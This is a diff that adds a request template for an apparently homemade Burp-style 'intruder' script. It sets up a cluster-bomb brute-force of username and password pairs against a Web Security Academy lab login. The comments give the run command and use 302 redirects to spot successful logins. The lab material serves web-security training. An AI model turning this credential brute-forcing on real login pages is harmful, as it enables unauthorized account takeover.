@@ -1,0 +1,21 @@
+# Cluster-bomb template: every (username, password) combination.
+#
+# Two markers in the body (§USER§ and §PW§) + cluster-bomb mode means
+# we send len(usernames) * len(passwords) requests. For the default
+# wordlists that's 101 * 100 = 10,100 requests.
+#
+# 1. Edit Host below to your lab ID.
+# 2. Run:
+#      python3 intruder.py examples/login-cluster-bomb.txt \
+#          --payload usernames.txt \
+#          --payload passwords.txt \
+#          --mode cluster-bomb \
+#          --match-status 302
+#
+# --match-status 302 filters output to just the successful login
+# (the redirect to /my-account).
+POST /login HTTP/1.1
+Host: YOUR-LAB-ID.web-security-academy.net
+Content-Type: application/x-www-form-urlencoded
+
+username=§USER§&password=§PW§
